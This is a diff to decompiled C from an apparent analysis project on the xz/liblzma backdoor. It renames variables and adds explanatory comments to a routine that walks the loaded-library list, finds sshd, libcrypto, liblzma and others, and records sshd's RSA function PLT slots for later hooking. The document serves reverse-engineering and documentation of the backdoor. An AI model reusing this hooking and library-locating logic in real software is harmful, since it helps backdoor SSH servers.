@@ -5,12 +5,7 @@
 
 
 /*
- * AutoDoc: Walks `r_debug->r_map` and classifies each entry by basename, aborting on duplicates or malformed maps. Only after locating sshd
- * (the main binary), libcrypto, ld-linux, libsystemd, liblzma, and libc does it parse the ELF images: sshd’s PLT is interrogated
- * to recover `RSA_public_decrypt`, `EVP_PKEY_set1_RSA`, and `RSA_get0_key`, liblzma’s RW data segment is recorded so the
- * `backdoor_hooks_data_t` blob and `hooks_data_addr` can be cached, libcrypto/libc descriptors are primed for later walkers, and
- * libc’s import table is filled via `resolve_libc_imports`. The result is a fully-populated `backdoor_shared_libraries_data_t` for
- * downstream stages.
+ * AutoDoc: Walks `_r_debug->r_map`, hashes each SONAME to an `EncodedStringId`, and refuses duplicate or malformed entries. Once sshd, libcrypto, ld.so, libsystemd, liblzma, and libc are all accounted for it parses the binaries in turn: sshd’s PLT yields the RSA hook slots, libcrypto/libc descriptors are primed for later import walks, liblzma’s writable PT_LOAD is recorded so the embedded `backdoor_hooks_data_t` blob can be accessed, and libc’s import table is populated via `resolve_libc_imports`.
  */
 
 #include "xzre_types.h"
@@ -18,20 +13,20 @@
 BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data_t *data)
 
 {
-  char name_char;
-  void **rsa_get0_key_slot;
-  void **evp_set1_rsa_slot;
-  void **rsa_public_decrypt_slot;
-  elf_info_t *elf_info;
-  link_map *map_cursor;
-  backdoor_data_t *shared_maps;
-  backdoor_hooks_data_t **hooks_data_addr_ptr;
-  EncodedStringId basename_id;
+  char path_char;
+  void **rsa_get0_key_slot_ptr;
+  void **evp_set1_rsa_slot_ptr;
+  void **rsa_public_decrypt_slot_ptr;
+  elf_info_t *elf_handle;
+  link_map *link_map_cursor;
+  backdoor_data_t *maps_state;
+  backdoor_hooks_data_t **hooks_data_slot;
+  EncodedStringId soname_id;
   BOOL success;
   Elf64_Sym *rtld_global_sym;
-  uchar *rtld_global_ptr;
-  ulong *plt_entry;
-  void *hooks_blob;
+  uchar *rtld_global_base;
+  ulong *plt_slot;
+  void *liblzma_data_segment;
   char *soname_cursor;
   char *basename_ptr;
   u64 liblzma_data_segment_size;
@@ -39,29 +34,31 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
   if (r_map == (link_map *)0x0) {
     return FALSE;
   }
+  // AutoDoc: `rtld_global` guards any ld.so candidate we accept later in the walk.
   rtld_global_sym = elf_symbol_get(data->elf_handles->ldso,STR_rtld_global,0);
   if (rtld_global_sym == (Elf64_Sym *)0x0) {
     return FALSE;
   }
   do {
+    // AutoDoc: End-of-list checks insist every required module was seen before we bail out.
     if (*(ulong *)(r_map + 0x18) == 0) {
-      shared_maps = data->shared_maps;
-      if (shared_maps->sshd_link_map == (link_map *)0x0) {
+      maps_state = data->shared_maps;
+      if (maps_state->sshd_link_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (shared_maps->libcrypto_link_map == (link_map *)0x0) {
+      if (maps_state->libcrypto_link_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (shared_maps->ldso_link_map == (link_map *)0x0) {
+      if (maps_state->ldso_link_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (shared_maps->libsystemd_link_map == (link_map *)0x0) {
+      if (maps_state->libsystemd_link_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (shared_maps->liblzma_link_map == (link_map *)0x0) {
+      if (maps_state->liblzma_link_map == (link_map *)0x0) {
         return FALSE;
       }
-      if (shared_maps->libc_link_map == (link_map *)0x0) {
+      if (maps_state->libc_link_map == (link_map *)0x0) {
         return FALSE;
       }
       break;
@@ -84,23 +81,25 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
       data->shared_maps->sshd_link_map = r_map;
     }
     else {
-      while (name_char = *soname_cursor, name_char != '\0') {
+      while (path_char = *soname_cursor, path_char != '\0') {
         soname_cursor = soname_cursor + 1;
-        if (name_char == '/') {
+        if (path_char == '/') {
           basename_ptr = soname_cursor;
         }
       }
-      basename_id = get_string_id(basename_ptr,soname_cursor);
-      shared_maps = data->shared_maps;
-      if (basename_id == STR_libc_so) {
-        if (shared_maps->libc_link_map != (link_map *)0x0) {
+      // AutoDoc: Collapse the SONAME into an enum so the classifier can switch over IDs instead of strings.
+      soname_id = get_string_id(basename_ptr,soname_cursor);
+      maps_state = data->shared_maps;
+      if (soname_id == STR_libc_so) {
+        if (maps_state->libc_link_map != (link_map *)0x0) {
           return FALSE;
         }
-        shared_maps->libc_link_map = r_map;
+        maps_state->libc_link_map = r_map;
       }
-      else if (basename_id < 0x7d1) {
-        if (basename_id == STR_liblzma_so) {
-          if (shared_maps->liblzma_link_map != (link_map *)0x0) {
+      else if (soname_id < 0x7d1) {
+        // AutoDoc: liblzma needs extra scrutiny (address sanity + `l_next`) before we trust the entry.
+        if (soname_id == STR_liblzma_so) {
+          if (maps_state->liblzma_link_map != (link_map *)0x0) {
             return FALSE;
           }
           if (0x10465f < *(ulong *)r_map) {
@@ -112,97 +111,102 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
           if (*(ulong *)(r_map + 0x18) == 0) {
             return FALSE;
           }
-          shared_maps->liblzma_link_map = r_map;
+          maps_state->liblzma_link_map = r_map;
         }
-        else if (basename_id == STR_libcrypto_so) {
-          if (shared_maps->libcrypto_link_map != (link_map *)0x0) {
+        else if (soname_id == STR_libcrypto_so) {
+          if (maps_state->libcrypto_link_map != (link_map *)0x0) {
             return FALSE;
           }
-          shared_maps->libcrypto_link_map = r_map;
+          maps_state->libcrypto_link_map = r_map;
         }
       }
-      else if (basename_id == STR_libsystemd_so) {
-        if (shared_maps->libsystemd_link_map != (link_map *)0x0) {
+      else if (soname_id == STR_libsystemd_so) {
+        if (maps_state->libsystemd_link_map != (link_map *)0x0) {
           return FALSE;
         }
-        shared_maps->libsystemd_link_map = r_map;
+        maps_state->libsystemd_link_map = r_map;
       }
-      else if (basename_id == STR_ld_linux_x86_64_so) {
-        if (shared_maps->ldso_link_map != (link_map *)0x0) {
+      else if (soname_id == STR_ld_linux_x86_64_so) {
+        if (maps_state->ldso_link_map != (link_map *)0x0) {
           return FALSE;
         }
-        elf_info = data->elf_handles->ldso;
-        rtld_global_ptr = elf_info->elfbase->e_ident + rtld_global_sym->st_value;
-        if (r_map <= rtld_global_ptr) {
+        elf_handle = data->elf_handles->ldso;
+        rtld_global_base = elf_handle->elfbase->e_ident + rtld_global_sym->st_value;
+        if (r_map <= rtld_global_base) {
           return FALSE;
         }
-        if (rtld_global_sym->st_size < (ulong)((long)r_map - (long)rtld_global_ptr)) {
+        if (rtld_global_sym->st_size < (ulong)((long)r_map - (long)rtld_global_base)) {
           return FALSE;
         }
-        if (*(Elf64_Dyn **)(r_map + 0x10) != elf_info->dynamic_segment) {
+        // AutoDoc: For ld.so entries verify the cached dynamic segment matches the runtime `l_info[DT_*]` pointer.
+        if (*(Elf64_Dyn **)(r_map + 0x10) != elf_handle->dynamic_segment) {
           return FALSE;
         }
-        shared_maps->ldso_link_map = r_map;
+        maps_state->ldso_link_map = r_map;
       }
     }
-    shared_maps = data->shared_maps;
+    maps_state = data->shared_maps;
     r_map = *(link_map **)(r_map + 0x18);
-  } while ((((shared_maps->sshd_link_map == (link_map *)0x0) ||
-            (shared_maps->libcrypto_link_map == (link_map *)0x0)) ||
-           (shared_maps->ldso_link_map == (link_map *)0x0)) ||
-          (((shared_maps->libsystemd_link_map == (link_map *)0x0 ||
-            (shared_maps->liblzma_link_map == (link_map *)0x0)) ||
-           (shared_maps->libc_link_map == (link_map *)0x0))));
-  rsa_get0_key_slot = data->rsa_get0_key_slot;
-  evp_set1_rsa_slot = data->evp_set1_rsa_slot;
-  rsa_public_decrypt_slot = data->rsa_public_decrypt_slot;
-  elf_info = data->elf_handles->sshd;
-  map_cursor = data->shared_maps->sshd_link_map;
-  if (map_cursor == (link_map *)0x0) {
+  } while ((((maps_state->sshd_link_map == (link_map *)0x0) ||
+            (maps_state->libcrypto_link_map == (link_map *)0x0)) ||
+           (maps_state->ldso_link_map == (link_map *)0x0)) ||
+          (((maps_state->libsystemd_link_map == (link_map *)0x0 ||
+            (maps_state->liblzma_link_map == (link_map *)0x0)) ||
+           (maps_state->libc_link_map == (link_map *)0x0))));
+  rsa_get0_key_slot_ptr = data->rsa_get0_key_slot;
+  evp_set1_rsa_slot_ptr = data->evp_set1_rsa_slot;
+  rsa_public_decrypt_slot_ptr = data->rsa_public_decrypt_slot;
+  elf_handle = data->elf_handles->sshd;
+  link_map_cursor = data->shared_maps->sshd_link_map;
+  if (link_map_cursor == (link_map *)0x0) {
     return FALSE;
   }
-  success = elf_parse(*(Elf64_Ehdr **)map_cursor,elf_info);
+  success = elf_parse(*(Elf64_Ehdr **)link_map_cursor,elf_handle);
   if (success == FALSE) {
     return FALSE;
   }
-  if (elf_info->gnurelro_present == FALSE) {
+  if (elf_handle->gnurelro_present == FALSE) {
     return FALSE;
   }
-  if ((elf_info->feature_flags & 0x20) == 0) {
+  if ((elf_handle->feature_flags & 0x20) == 0) {
     return FALSE;
   }
-  plt_entry = (ulong *)elf_get_plt_symbol(elf_info,STR_RSA_public_decrypt);
-  *rsa_public_decrypt_slot = plt_entry;
-  if (plt_entry < (ulong *)0x1000000) {
-    plt_entry = (ulong *)elf_get_plt_symbol(elf_info,STR_EVP_PKEY_set1_RSA);
-    *evp_set1_rsa_slot = plt_entry;
-    if (((ulong *)0xffffff < plt_entry) && (0xffffff < *plt_entry)) {
+  // AutoDoc: Record sshd’s RSA PLT slots so the hook installer knows exactly which GOT entries to patch.
+  plt_slot = (ulong *)elf_get_plt_symbol(elf_handle,STR_RSA_public_decrypt);
+  *rsa_public_decrypt_slot_ptr = plt_slot;
+  if (plt_slot < (ulong *)0x1000000) {
+    plt_slot = (ulong *)elf_get_plt_symbol(elf_handle,STR_EVP_PKEY_set1_RSA);
+    *evp_set1_rsa_slot_ptr = plt_slot;
+    if (((ulong *)0xffffff < plt_slot) && (0xffffff < *plt_slot)) {
       return FALSE;
     }
-    plt_entry = (ulong *)elf_get_plt_symbol(elf_info,STR_RSA_get0_key);
-    *rsa_get0_key_slot = plt_entry;
-    if (plt_entry < (ulong *)0x1000000) goto LAB_00104924;
+    plt_slot = (ulong *)elf_get_plt_symbol(elf_handle,STR_RSA_get0_key);
+    *rsa_get0_key_slot_ptr = plt_slot;
+    if (plt_slot < (ulong *)0x1000000) goto LAB_00104924;
   }
-  if (0xffffff < *plt_entry) {
+  if (0xffffff < *plt_slot) {
     return FALSE;
   }
 LAB_00104924:
-  map_cursor = data->shared_maps->libcrypto_link_map;
-  if ((map_cursor != (link_map *)0x0) &&
-     (success = elf_parse(*(Elf64_Ehdr **)map_cursor,data->elf_handles->libcrypto), success != FALSE)) {
-    hooks_data_addr_ptr = data->hooks_data_slot;
+  link_map_cursor = data->shared_maps->libcrypto_link_map;
+  if ((link_map_cursor != (link_map *)0x0) &&
+     (success = elf_parse(*(Elf64_Ehdr **)link_map_cursor,data->elf_handles->libcrypto), success != FALSE)) {
+    hooks_data_slot = data->hooks_data_slot;
     liblzma_data_segment_size = 0;
-    elf_info = data->elf_handles->liblzma;
-    map_cursor = data->shared_maps->liblzma_link_map;
-    if ((map_cursor != (link_map *)0x0) &&
-       (((success = elf_parse(*(Elf64_Ehdr **)map_cursor,elf_info), success != FALSE &&
-         ((elf_info->feature_flags & 0x20) != 0)) &&
-        (hooks_blob = elf_get_data_segment(elf_info,&liblzma_data_segment_size,TRUE), 0x597 < liblzma_data_segment_size)))) {
-      *hooks_data_addr_ptr = (backdoor_hooks_data_t *)((long)hooks_blob + 0x10);
-      *(u64 *)((long)hooks_blob + 0x590) = liblzma_data_segment_size - 0x598;
-      map_cursor = data->shared_maps->libc_link_map;
-      if ((map_cursor != (link_map *)0x0) &&
-         (success = elf_parse(*(Elf64_Ehdr **)map_cursor,data->elf_handles->libc), success != FALSE)) {
+    elf_handle = data->elf_handles->liblzma;
+    link_map_cursor = data->shared_maps->liblzma_link_map;
+    if ((link_map_cursor != (link_map *)0x0) &&
+       (((success = elf_parse(*(Elf64_Ehdr **)link_map_cursor,elf_handle), success != FALSE &&
+         ((elf_handle->feature_flags & 0x20) != 0)) &&
+        // AutoDoc: Cache liblzma’s writable PT_LOAD and make sure the hooks blob plus scratch space fit inside it.
+        (liblzma_data_segment = elf_get_data_segment(elf_handle,&liblzma_data_segment_size,TRUE), 0x597 < liblzma_data_segment_size)))) {
+      *hooks_data_slot = (backdoor_hooks_data_t *)((long)liblzma_data_segment + 0x10);
+      // AutoDoc: Publish how much writable padding remains after the hooks blob so later stages can borrow it.
+      *(u64 *)((long)liblzma_data_segment + 0x590) = liblzma_data_segment_size - 0x598;
+      link_map_cursor = data->shared_maps->libc_link_map;
+      if ((link_map_cursor != (link_map *)0x0) &&
+         (success = elf_parse(*(Elf64_Ehdr **)link_map_cursor,data->elf_handles->libc), success != FALSE)) {
+        // AutoDoc: Once libc’s `link_map` is parsed, immediately resolve the `read`/`__errno_location` trampolines.
         success = resolve_libc_imports
                            (data->shared_maps->libc_link_map,data->elf_handles->libc,
                             data->libc_imports);
